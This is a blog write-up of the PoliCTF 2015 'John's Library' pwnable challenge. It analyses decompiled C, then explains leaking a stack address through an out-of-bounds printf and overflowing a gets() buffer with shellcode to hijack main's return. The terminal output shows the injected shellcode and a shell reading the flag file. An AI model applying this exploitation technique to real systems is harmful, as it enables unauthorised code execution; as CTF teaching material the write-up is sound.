---
layout: post
title: "PoliCTF 2015 Pwnable150 John's Library Writeup"
date: 2015-07-15 07:59:02 +0800
comments: true
categories: [ctf, writeup, polictf, 2015]
---

The server ([download](https://github.com/ctfs/write-ups-2015/tree/master/polictf-2015/pwnable/johns-library)) is a 32-bit non-stripped binary. When we connect to the server, we got three options:
```
Welcome to the jungle library mate! Try to escape!!
 
 r - read from library
 a - add element
 u - exit
```

Let's see what the first two options do:
<!-- more -->

``` c read_from_library
int read_from_library(int arg_0)
{
  int v2; 

  printf("Insert the index of the book you want to read: ");
  fflush(stdout);
  __isoc99_scanf("%d", &v2);
  getchar();
  printf("%s", len[v2] + arg_0);
  return fflush(stdout);
}
```

``` c add_element
int add_element_to_library(int a1)
{
  int result; 
  int v2; 

  puts("Hey mate! Insert how long is the book title: ");
  fflush(stdout);
  __isoc99_scanf("%d", &v2);
  getchar();
  if ( len[num] + v2 > 1024 )
  {
    puts("Hey you! what are you trying to do??");
    fflush(stdout);
    exit(-1);
  }
  ++num;
  gets((len[num - 1] + a1));
  result = num;
  len[num] = len[num - 1] + 1 + v2;
  return result;
}
```

Inside add\_element\_to\_library(), we can see that there is a call to gets(), which is a dangerous function. The variable 'a1' is the address of a buffer, which is defined in main(), so naturally we can think of buffer overflow attack. Let's examine the binary more closely inside gdb:

```
gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
gdb-peda$ 
```

The NX is disabled, so the exploitation becomes straightforward: fill in the buffer ('a1') with shellcode, then replace the return address of main() (since the buffer is defined in main()) with the address of the shellcode. After that, we just need to select "u - exit" to return from main(). Then our shellcode gets executed.

Now the only problem is: how to get the address of the buffer/shellcode.

Inside read\_from\_library(), there is a call to printf():
``` c snippet from read_from_library
printf("%s", len[v2] + arg_0);
```
The variable arg\_0 is also the address of the buffer defined in main(), and 'len' is a global array of integers. Here we are able to print the content located at the address of the buffer ('arg\_0') plus an offset ('len[v2]'). Meanwhile, the offset ('len[v2]') can be controlled inside add\_element\_to\_library():
``` c snippet from add_element_to_library
__isoc99_scanf("%d", &v2);
...
++num;
...
len[num] = len[num - 1] + 1 + v2;
```
This shows that the current offset is determined in the previous call to add\_element\_to\_library().

With all of those info, we can perform the following steps:

* select "a - add element" to set the offset properly 
* select "r - read from library" to leak the address based on the offset set before and get the address of the buffer
* select "a - add element" again to set the offset properly (here I choose to reset the offset to 0 )
* select "a - add element" to send the shellcode concatenated with repeated addresses of the buffer (we need to make this long enough to overwrite the return address of main())
* select "u - exit" to return from main() so that our shellcode gets executed

In order to leak the desired address info,  we need to set the offset correctly in the first step. The call stack will look like this when the function gets() is called:

``` plain
+--------------------+
|         ...        | (higher addresses)
+--------------------+

+--------------------+ <-- start of stack frame of main()
|   return address   | <-- address we want to overwrite
+--------------------+
|   previous ebp     |
+--------------------+
|    the buffer      |
+--------------------+
|       ...          |
+--------------------+
|    the buffer      |
+--------------------+ <-- the address of the buffer

+--------------------+ <-- start of stack frame of add_element_to_library()
| addr of the buffer | <-- parameter of add_element_to_library()
+--------------------+
|   return address   | <-- the address of the instruction after calling add_element_to_library() in main() (0x08048622)
+--------------------+
|   ebp of main()    |
+--------------------+
|       ...          |
+--------------------+
|(frame of gets()..) |
+--------------------+
```

Since the stack grows from higher addresses to lower addresses, the offset we need is a negative number, and it can be found easily using gdb. (I leaked ebp of main() to calculate the address of the buffer, but obviously I can use the address of the buffer directly..)

Here are the code the and the result:
{% include_code poli2015/johns-library.py %}

``` plain
alpha@alpha-th:~$ python johns-library.py
...
ebp: 0xff81fd98
addr buf: 0xff81f98b
 
 r - read from library
 a - add element
 u - exit
a
Hey mate! Insert how long is the book title: 
33
�����
 
 r - read from library
 a - add element
 u - exit
a
 
 r - read from library
 a - add element
 u - exit
Hey mate! Insert how long is the book title: 
2
���1�Ph//shh/bin��PS���
                       ��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
 
 r - read from library
 a - add element
 u - exit
u
id
uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
cat /home/ctf/flag
flag{John_should_read_a_real_book_on_s3cur3_pr0gr4mm1ng}
```
